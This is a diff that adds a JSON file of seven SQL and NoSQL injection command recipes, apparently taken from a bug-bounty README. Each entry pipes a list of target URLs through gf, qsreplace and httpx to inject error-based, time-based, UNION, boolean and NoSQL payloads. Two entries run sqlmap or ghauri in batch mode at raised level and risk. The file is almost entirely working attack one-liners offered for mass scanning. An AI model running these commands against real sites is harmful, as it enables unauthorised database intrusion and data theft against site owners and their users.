@@ -1,0 +1,79 @@
+[
+    {
+        "title": "\ud83d\uddc4\ufe0f SQL Injection",
+        "class": "SQLi",
+        "tools": [
+            "gf"
+        ],
+        "command_pattern": "cat urls.txt | gf sqli | uro | anew sqli.txt && sqlmap -m sqli.txt --batch --random-agent --level 2 --risk 2",
+        "prerequisites": [],
+        "source_ref": "Readme.md"
+    },
+    {
+        "title": "\ud83d\uddc4\ufe0f SQL Injection",
+        "class": "SQLi",
+        "tools": [
+            "httpx",
+            "qsreplace",
+            "gf"
+        ],
+        "command_pattern": "cat urls.txt | gf sqli | qsreplace \"'\" | httpx -silent -ms \"error|sql|syntax|mysql|postgresql|oracle\" | anew sqli_errors.txt",
+        "prerequisites": [],
+        "source_ref": "Readme.md"
+    },
+    {
+        "title": "\ud83d\uddc4\ufe0f SQL Injection",
+        "class": "SQLi",
+        "tools": [
+            "httpx",
+            "qsreplace",
+            "gf"
+        ],
+        "command_pattern": "cat urls.txt | gf sqli | qsreplace \"1' AND SLEEP(5)-- -\" | httpx -silent -timeout 10 | anew time_based.txt",
+        "prerequisites": [],
+        "source_ref": "Readme.md"
+    },
+    {
+        "title": "\ud83d\uddc4\ufe0f SQL Injection",
+        "class": "SQLi",
+        "tools": [],
+        "command_pattern": "cat sqli.txt | xargs -I@ ghauri -u @ --batch --level 3",
+        "prerequisites": [],
+        "source_ref": "Readme.md"
+    },
+    {
+        "title": "\ud83d\uddc4\ufe0f SQL Injection",
+        "class": "SQLi",
+        "tools": [
+            "httpx",
+            "qsreplace",
+            "gf"
+        ],
+        "command_pattern": "cat urls.txt | gf sqli | qsreplace \"1 UNION SELECT NULL,NULL,NULL-- -\" | httpx -silent -mc 200",
+        "prerequisites": [],
+        "source_ref": "Readme.md"
+    },
+    {
+        "title": "\ud83d\uddc4\ufe0f SQL Injection",
+        "class": "SQLi",
+        "tools": [
+            "httpx",
+            "qsreplace",
+            "gf"
+        ],
+        "command_pattern": "cat urls.txt | gf sqli | qsreplace \"1' AND '1'='1\" | httpx -silent -mc 200 | anew boolean_sqli.txt",
+        "prerequisites": [],
+        "source_ref": "Readme.md"
+    },
+    {
+        "title": "\ud83d\uddc4\ufe0f SQL Injection",
+        "class": "SQLi",
+        "tools": [
+            "httpx",
+            "qsreplace"
+        ],
+        "command_pattern": "cat urls.txt | qsreplace '{\"$gt\":\"\"}' | httpx -silent -mc 200 | anew nosqli.txt\ncat urls.txt | qsreplace \"admin'||'1'=='1\" | httpx -silent | anew nosqli.txt",
+        "prerequisites": [],
+        "source_ref": "Readme.md"
+    }
+]
